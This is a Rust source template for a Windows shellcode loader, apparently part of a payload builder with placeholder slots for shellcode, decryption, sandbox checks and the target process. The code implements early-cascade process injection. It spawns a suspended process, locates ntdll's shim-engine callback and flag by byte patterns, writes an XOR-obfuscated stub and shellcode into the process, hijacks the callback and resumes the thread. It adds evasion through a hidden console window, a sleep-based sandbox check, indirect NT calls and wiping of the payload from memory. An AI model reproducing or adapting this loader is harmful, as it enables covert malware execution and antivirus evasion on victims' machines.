#![windows_subsystem = "windows"]
#![allow(non_snake_case, non_camel_case_types)]

mod stubs;

use std::include_bytes;
use std::mem;
use std::ptr::null_mut;
use std::slice;
use std::thread;
use std::time::{Duration, Instant};
use core::ffi::c_void;

use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA,
};

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

type HANDLE = *mut c_void;

#[inline]
fn nt_success(s: i32) -> bool { s >= 0 }

{{NT_CALL_MACRO}}

const STUB_KEY: u8 = {{API_KEY}};

#[repr(C)]
struct DosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct FileHeader {
    _machine: u16,
    number_of_sections: u16,
    _ts: u32,
    _sym_table: u32,
    _sym_count: u32,
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct SectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    _rest: [u8; 24],
}

struct PatternDef {
    data: &'static [u8],
    pc_off: usize,
}

fn pause(ms: u64) {
    thread::sleep(Duration::from_millis(ms));
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn section_eq(name: &[u8; 8], target: &[u8]) -> bool {
    target.len() <= 8
        && name[..target.len()] == *target
        && name[target.len()..].iter().all(|&b| b == 0)
}

fn encode_ptr(ptr: usize) -> usize {
    unsafe {
        let cookie = *(0x7FFE0330usize as *const u32);
        let xored = (cookie as u64) ^ (ptr as u64);
        xored.rotate_right(cookie & 0x3F) as usize
    }
}

unsafe fn get_sections(
    base: usize,
) -> (
    Option<*const SectionHeader>,
    Option<*const SectionHeader>,
    Option<*const SectionHeader>,
) {
    let dos = base as *const DosHeader;
    let nt_base = base + (*dos).e_lfanew as usize;
    let fh = (nt_base + 4) as *const FileHeader;
    let num = (*fh).number_of_sections as usize;
    let sec_start =
        (fh as usize) + mem::size_of::<FileHeader>() + (*fh).size_of_optional_header as usize;

    let (mut text, mut mrdata, mut data) = (None, None, None);
    for i in 0..num {
        let s = (sec_start + i * mem::size_of::<SectionHeader>()) as *const SectionHeader;
        if section_eq(&(*s).name, b".text") {
            text = Some(s);
        }
        if section_eq(&(*s).name, b".mrdata") {
            mrdata = Some(s);
        }
        if section_eq(&(*s).name, b".data") {
            data = Some(s);
        }
    }

    (text, mrdata, data)
}

unsafe fn find_callback(base: usize) -> Option<(usize, usize)> {
    let (text, mrdata, _) = get_sections(base);
    let text = text?;
    let mrdata = mrdata?;

    let patterns = [PatternDef {
        data: &[0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F, 0x8B, 0xC2, 0x48, 0x8B, 0x3D],
        pc_off: 4,
    }];

    let t_start = base + (*text).virtual_address as usize;
    let t_bytes = slice::from_raw_parts(t_start as *const u8, (*text).virtual_size as usize);
    let mr_start = base + (*mrdata).virtual_address as usize;
    let mr_end = mr_start + (*mrdata).virtual_size as usize;

    for pat in &patterns {
        let mut off = 0;
        while off < t_bytes.len() {
            if let Some(pos) = find_bytes(&t_bytes[off..], pat.data) {
                let match_end = t_start + off + pos + pat.data.len();
                if *((match_end + 3) as *const u8) == 0x00 {
                    let disp = *(match_end as *const u32) as usize;
                    let target = match_end + disp + pat.pc_off;
                    if target >= mr_start && target < mr_end {
                        return Some((target, match_end));
                    }
                }
                off += pos + pat.data.len();
            } else {
                break;
            }
        }
    }

    None
}

unsafe fn find_shims_flag(base: usize, offset_addr: usize) -> Option<usize> {
    let (_, _, data) = get_sections(base);
    let data = data?;

    let patterns = [
        PatternDef { data: &[0xC6, 0x05], pc_off: 5 },
        PatternDef { data: &[0x44, 0x38, 0x25], pc_off: 4 },
    ];

    let d_start = base + (*data).virtual_address as usize;
    let d_end = d_start + (*data).virtual_size as usize;
    let s_start = offset_addr.saturating_sub(0xFF);
    let s_end = offset_addr + 0xFF;
    let s_bytes = slice::from_raw_parts(s_start as *const u8, s_end - s_start);

    for pat in &patterns {
        let mut off = 0;
        while off < s_bytes.len() {
            if let Some(pos) = find_bytes(&s_bytes[off..], pat.data) {
                let match_end = s_start + off + pos + pat.data.len();
                if *((match_end + 3) as *const u8) == 0x00 {
                    let disp = *(match_end as *const u32) as usize;
                    let target = match_end + disp + pat.pc_off;
                    if target >= d_start && target < d_end {
                        return Some(target);
                    }
                }
                off += pos + pat.data.len();
            } else {
                break;
            }
        }
    }

    None
}

unsafe fn do_inject(pi: &PROCESS_INFORMATION, sc: &[u8]) -> bool {
    let ntdll_base = dyncvoke_core::get_module_base_address(
        data::lc!("ntdll.dll").as_str()
    );
    if ntdll_base == 0 {
        return false;
    }

    let (cb_addr, off_addr) = match find_callback(ntdll_base) {
        Some(v) => v,
        None => return false,
    };

    let shims_addr = match find_shims_flag(ntdll_base, off_addr) {
        Some(v) => v,
        None => return false,
    };

    let mut stub: Vec<u8> = stubs::STUB.iter().map(|b| b ^ STUB_KEY).collect();
    let marker_pos = stubs::STUB_PLACEHOLDER_OFFSET;
    if marker_pos + 8 > stub.len() {
        return false;
    }
    stub[marker_pos..marker_pos + 8].copy_from_slice(&shims_addr.to_le_bytes());

    let stub_len = stub.len();
    let total = stub_len + 1 + sc.len();

    let h_proc: HANDLE = pi.hProcess as HANDLE;
    let h_thread: HANDLE = pi.hThread as HANDLE;

    let mut buf: *mut c_void = null_mut();
    let mut alloc_size: usize = total;
    let s = ntcall!("NtAllocateVirtualMemory",
        h_proc,
        &mut buf as *mut *mut c_void,
        0usize,
        &mut alloc_size as *mut usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if !nt_success(s) {
        return false;
    }

    let sc_remote = (buf as usize + stub_len + 1) as *mut c_void;

    let mut written: usize = 0;
    let s = ntcall!("NtWriteVirtualMemory",
        h_proc,
        buf,
        stub.as_ptr() as *mut c_void,
        stub_len,
        &mut written as *mut usize,
    );
    if !nt_success(s) {
        return false;
    }

    let s = ntcall!("NtWriteVirtualMemory",
        h_proc,
        sc_remote,
        sc.as_ptr() as *mut c_void,
        sc.len(),
        &mut written as *mut usize,
    );
    if !nt_success(s) {
        return false;
    }

    let mut prot_base: *mut c_void = buf;
    let mut prot_size: usize = total;
    let mut old_protect: u32 = 0;
    let s = ntcall!("NtProtectVirtualMemory",
        h_proc,
        &mut prot_base as *mut *mut c_void,
        &mut prot_size as *mut usize,
        PAGE_EXECUTE_READ,
        &mut old_protect as *mut u32,
    );
    if !nt_success(s) {
        return false;
    }

    for b in stub.iter_mut() {
        std::ptr::write_volatile(b as *mut u8, 0);
    }

    let encoded = encode_ptr(buf as usize);
    let s = ntcall!("NtWriteVirtualMemory",
        h_proc,
        cb_addr as *mut c_void,
        &encoded as *const usize as *mut c_void,
        mem::size_of::<usize>(),
        &mut written as *mut usize,
    );
    if !nt_success(s) {
        return false;
    }

    let enable: i32 = 1;
    let s = ntcall!("NtWriteVirtualMemory",
        h_proc,
        shims_addr as *mut c_void,
        &enable as *const i32 as *mut c_void,
        mem::size_of::<i32>(),
        &mut written as *mut usize,
    );
    if !nt_success(s) {
        return false;
    }

    let mut prev_count: u32 = 0;
    let s = ntcall!("NtResumeThread", h_thread, &mut prev_count as *mut u32);
    nt_success(s)
}

fn cascade(sc: &[u8]) {
    unsafe {
        let mut cmd = b"{{TARGET_PROCESS}}\0".to_vec();
        let mut si: STARTUPINFOA = mem::zeroed();
        si.cb = mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = mem::zeroed();

        if CreateProcessA(
            null_mut(),
            cmd.as_mut_ptr(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            return;
        }

        let ok = do_inject(&pi, sc);

        if !ok && !pi.hProcess.is_null() {
            let _ = ntcall!("NtTerminateProcess", pi.hProcess as HANDLE, 1i32);
        }

        if !pi.hThread.is_null() {
            let _ = ntcall!("NtClose", pi.hThread as HANDLE);
        }
        if !pi.hProcess.is_null() {
            let _ = ntcall!("NtClose", pi.hProcess as HANDLE);
        }
    }
}

fn main() {
    {{SANDBOX}}

    if !check_environment() { return; }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    cascade(&vec);
    wipe(&mut vec);
}

{{DLL_MAIN}}
